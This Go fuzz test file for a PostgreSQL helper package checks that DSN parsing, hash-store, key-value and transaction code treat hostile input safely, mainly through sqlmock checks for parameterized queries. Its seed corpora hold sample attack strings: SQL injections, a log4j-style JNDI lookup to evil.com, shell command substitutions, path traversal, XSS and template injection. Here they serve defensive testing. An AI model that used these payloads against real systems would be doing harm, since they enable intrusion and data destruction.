// pkg/eos_postgres/postgres_fuzz_test.go
//go:build go1.18
// +build go1.18

package eos_postgres

import (
	"context"
	"database/sql"
	"os"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/DATA-DOG/go-sqlmock"
)

// FuzzDSNParsing tests DSN parsing for potential security issues
func FuzzDSNParsing(f *testing.F) {
	// Add seed corpus with various DSN formats
	seeds := []string{
		"postgres://user:pass@localhost/db",
		"postgres://user:pass@localhost:5432/db?sslmode=disable",
		"postgres://user@localhost/db",
		"postgresql://user:pass@host:5432/db?param1=value1&param2=value2",
		"postgres://user:p@ss:w0rd@localhost/db", // password with special chars
		"postgres://user%20name:pass@localhost/db", // URL encoded username
		"postgres://user:pass@192.168.1.1:5432/db",
		"postgres://user:pass@[::1]:5432/db", // IPv6
		"postgres://user:pass@host/db?connect_timeout=10",
		"", // empty DSN
		"not-a-dsn",
		"postgres://", // incomplete
		"postgres://user:pass@/db", // missing host
		"postgres://user:pass@:5432/db", // missing host with port
		"postgres://:pass@localhost/db", // missing user
		"postgres://user:@localhost/db", // missing password
		"postgres://user:pass@localhost/", // missing database
		"postgres://user:pass@localhost:notaport/db", // invalid port
		"postgres://user:pass@localhost:99999/db", // port out of range
		"postgres://user:pass@host with spaces/db", // spaces in host
		"postgres://user:pass@host/db with spaces", // spaces in db name
		"postgres://user:pass@host/db?invalid param=value", // invalid param
		"postgres://user:pass@host/db?param=value with spaces", // spaces in param value
		"postgres://user:pass@host/../../etc/passwd", // path traversal attempt
		"postgres://user:pass@host/db;DROP TABLE users;--", // SQL injection attempt
		"postgres://user:pass@host/db%00", // null byte
		"postgres://user:pass@host/db\x00", // null byte variant
		"postgres://user:pass@host/db%20OR%201=1", // SQL injection encoded
		"postgres://user:pass@host/db?sslmode=disable;DROP TABLE", // injection in params
		strings.Repeat("a", 1000), // long string
		strings.Repeat("postgres://user:pass@host/db?", 100), // many params
		"postgres://" + strings.Repeat("a", 255) + ":pass@host/db", // long username
		"postgres://user:" + strings.Repeat("b", 255) + "@host/db", // long password
		"postgres://user:pass@" + strings.Repeat("c", 255) + "/db", // long host
		"postgres://user:pass@host/" + strings.Repeat("d", 255), // long database
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, dsn string) {
		// Skip invalid UTF-8 strings
		if !utf8.ValidString(dsn) {
			t.Skip("Invalid UTF-8 string")
		}

		// Test that Open handles any DSN safely
		ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
		defer cancel()

		db, err := Open(ctx, dsn)
		if db != nil {
			_ = db.Close()
		}

		// Verify no panic occurred (caught by fuzzer)
		// Check for potential security issues in error messages
		if err != nil {
			errStr := err.Error()
			
			// Error messages should not reflect raw user input to prevent information leakage
			// Note: pgx driver may include database name in error, which is acceptable
			// We're mainly concerned about command execution indicators
			if strings.Contains(dsn, "DROP TABLE") && strings.Contains(errStr, "DROP TABLE") {
				t.Logf("Warning: Error message reflects potential SQL injection: %v", err)
			}
			
			// Path traversal in database names is handled safely by pgx
			if strings.Contains(dsn, "../") && strings.Contains(errStr, "../") {
				t.Logf("Note: Path traversal attempt in DSN was safely handled: %v", err)
			}
		}
	})
}

// FuzzHashOperations tests hash store operations for edge cases
func FuzzHashOperations(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"",
		"a",
		"abc123",
		"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", // SHA256 of empty string
		strings.Repeat("a", 64), // typical hash length
		strings.Repeat("b", 128), // double hash length
		"'; DROP TABLE sent_alerts; --", // SQL injection
		"' OR '1'='1", // SQL injection
		"\x00", // null byte
		"hash\x00with\x00nulls",
		"hash\nwith\nnewlines",
		"hash\twith\ttabs",
		"hash with spaces",
		"HASH_WITH_UPPERCASE",
		"hash-with-dashes",
		"hash_with_underscores",
		"hash.with.dots",
		"hash/with/slashes",
		"hash\\with\\backslashes",
		"hash'with'quotes",
		`hash"with"doublequotes`,
		"hash`with`backticks",
		strings.Repeat("x", 1000), // long hash
		"🔒🔑🎯", // unicode
		"\u0000\u0001\u0002", // control characters
		"<script>alert('xss')</script>", // XSS attempt
		"${jndi:ldap://evil.com/a}", // log4j style injection
		"{{7*7}}", // template injection
		"$(echo pwned)", // command injection
		"`echo pwned`", // command injection variant
		"hash%20with%20encoding",
		"hash+with+plus",
		"hash%00with%00null",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, hash string) {
		// Skip invalid UTF-8
		if !utf8.ValidString(hash) {
			t.Skip("Invalid UTF-8 string")
		}

		db, mock, err := sqlmock.New()
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = db.Close() }()

		store := &pgHashStore{db: db}

		// Test Seen with various inputs
		mock.ExpectQuery("select exists\\(select 1 from sent_alerts where hash=\\$1\\)").
			WithArgs(hash).
			WillReturnRows(sqlmock.NewRows([]string{"exists"}).AddRow(false))

		seen := store.Seen(hash)
		if seen {
			t.Errorf("Unexpected seen=true for hash: %q", hash)
		}

		// Test Mark with various inputs
		mock.ExpectExec("insert into sent_alerts\\(hash\\) values\\(\\$1\\) on conflict do nothing").
			WithArgs(hash).
			WillReturnResult(sqlmock.NewResult(1, 1))

		err = store.Mark(hash)
		if err != nil {
			// Mark should handle any string safely
			t.Errorf("Mark failed for hash %q: %v", hash, err)
		}

		// Verify expectations were met (parameterized queries were used)
		if err := mock.ExpectationsWereMet(); err != nil {
			t.Errorf("Unmet expectations for hash %q: %v", hash, err)
		}
	})
}

// FuzzKVOperations tests key-value operations
func FuzzKVOperations(f *testing.F) {
	// Add seed corpus for keys and values
	seeds := []struct {
		key   string
		value string
	}{
		{"", ""},
		{"key", "value"},
		{"key with spaces", "value with spaces"},
		{"key\nwith\nnewlines", "value\nwith\nnewlines"},
		{"key\twith\ttabs", "value\twith\ttabs"},
		{"key'with'quotes", "value'with'quotes"},
		{`key"with"quotes`, `value"with"quotes`},
		{"key`with`backticks", "value`with`backticks"},
		{"'; DROP TABLE kvm; --", "'; DROP TABLE kvm; --"},
		{"' OR '1'='1", "' OR '1'='1"},
		{"\x00", "\x00"},
		{"key\x00with\x00null", "value\x00with\x00null"},
		{strings.Repeat("k", 1000), strings.Repeat("v", 1000)},
		{"🔑", "🔒"},
		{"${jndi:ldap://evil.com/a}", "${jndi:ldap://evil.com/a}"},
		{"{{7*7}}", "{{7*7}}"},
		{"<script>alert('xss')</script>", "<script>alert('xss')</script>"},
		{"../../../etc/passwd", "../../../etc/passwd"},
		{"key%20encoded", "value%20encoded"},
		{"key+plus", "value+plus"},
	}

	for _, seed := range seeds {
		f.Add(seed.key, seed.value)
	}

	f.Fuzz(func(t *testing.T, key, value string) {
		// Skip invalid UTF-8
		if !utf8.ValidString(key) || !utf8.ValidString(value) {
			t.Skip("Invalid UTF-8 string")
		}

		db, mock, err := sqlmock.New()
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = db.Close() }()

		ctx := context.Background()

		// Test PutKV
		mock.ExpectExec("insert into kvm\\(key,val\\) values\\(\\$1,\\$2\\)").
			WithArgs(key, value).
			WillReturnResult(sqlmock.NewResult(1, 1))

		err = PutKV(ctx, db, key, value)
		if err != nil {
			t.Errorf("PutKV failed for key=%q, value=%q: %v", key, value, err)
		}

		// Test GetKV
		mock.ExpectQuery("select val from kvm where key=\\$1").
			WithArgs(key).
			WillReturnRows(sqlmock.NewRows([]string{"val"}).AddRow(value))

		gotValue, err := GetKV(ctx, db, key)
		if err != nil {
			t.Errorf("GetKV failed for key=%q: %v", key, err)
		}
		if gotValue != value {
			t.Errorf("GetKV returned wrong value for key=%q: got %q, want %q", key, gotValue, value)
		}

		// Verify parameterized queries were used
		if err := mock.ExpectationsWereMet(); err != nil {
			t.Errorf("Unmet expectations: %v", err)
		}
	})
}

// FuzzTransactionIsolation tests transaction handling with concurrent-like operations
func FuzzTransactionIsolation(f *testing.F) {
	// Add seeds that might cause issues in transactions
	seeds := []string{
		"normal_value",
		"value'; COMMIT; DROP TABLE test; --",
		"value'); ROLLBACK; --",
		"value\x00with\x00null",
		strings.Repeat("a", 10000),
		"'; UPDATE test SET val='hacked'; --",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, value string) {
		if !utf8.ValidString(value) {
			t.Skip("Invalid UTF-8 string")
		}

		db, mock, err := sqlmock.New()
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = db.Close() }()

		ctx := context.Background()

		// Test that transaction isolation prevents injection
		mock.ExpectBegin()
		mock.ExpectExec("INSERT INTO test VALUES \\(\\$1\\)").
			WithArgs(value).
			WillReturnResult(sqlmock.NewResult(1, 1))
		mock.ExpectCommit()

		err = WithTx(ctx, db, func(tx *sql.Tx) error {
			_, err := tx.Exec("INSERT INTO test VALUES ($1)", value)
			return err
		})

		if err != nil {
			t.Errorf("Transaction failed for value=%q: %v", value, err)
		}

		// Verify transaction was properly handled
		if err := mock.ExpectationsWereMet(); err != nil {
			t.Errorf("Transaction not properly isolated for value=%q: %v", value, err)
		}
	})
}

// FuzzEnvironmentDSN tests handling of environment variable DSN
func FuzzEnvironmentDSN(f *testing.F) {
	// Add various DSN formats that might be in environment
	seeds := []string{
		"",
		"postgres://localhost",
		"postgres://user:pass@host/db",
		"postgres://user:p@$$w0rd!@host/db", // special chars in password
		"postgres://${USER}:${PASS}@${HOST}/${DB}", // unexpanded vars
		"postgres://user:pass@host/db; echo pwned", // command injection
		"postgres://user:pass@host/db\necho pwned", // newline injection
		"postgres://user:pass@host/db`echo pwned`", // backtick injection
		"postgres://user:pass@host/db$(echo pwned)", // subshell injection
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, dsn string) {
		if !utf8.ValidString(dsn) {
			t.Skip("Invalid UTF-8 string")
		}

		// Save original env
		original := os.Getenv("POSTGRES_DSN")
		defer func() { _ = os.Setenv("POSTGRES_DSN", original) }()

		// Set fuzzed DSN
		_ = os.Setenv("POSTGRES_DSN", dsn)

		// Test Connect
		db, err := Connect()
		if db != nil {
			// We don't actually want to connect, just test parsing
			// In real scenario, this would be mocked
		}

		// Verify no injection or unexpected behavior
		if err != nil && dsn != "" {
			errStr := err.Error()
			// Check that error doesn't indicate command execution
			// Note: The error may contain the database name which includes "pwned"
			// This is expected behavior from pgx, not actual command execution
			if strings.Contains(errStr, "pwned") && !strings.Contains(errStr, "database=") {
				t.Errorf("Possible command injection in DSN handling: %v", err)
			}
		}

		// Test NewPGHashStore with fuzzed DSN
		ctx := context.Background()
		store, err := NewPGHashStore(ctx)
		if store != nil {
			// Don't actually use the store
		}

		// Empty DSN should always error
		if dsn == "" && err == nil {
			t.Error("Expected error for empty DSN")
		}
	})
}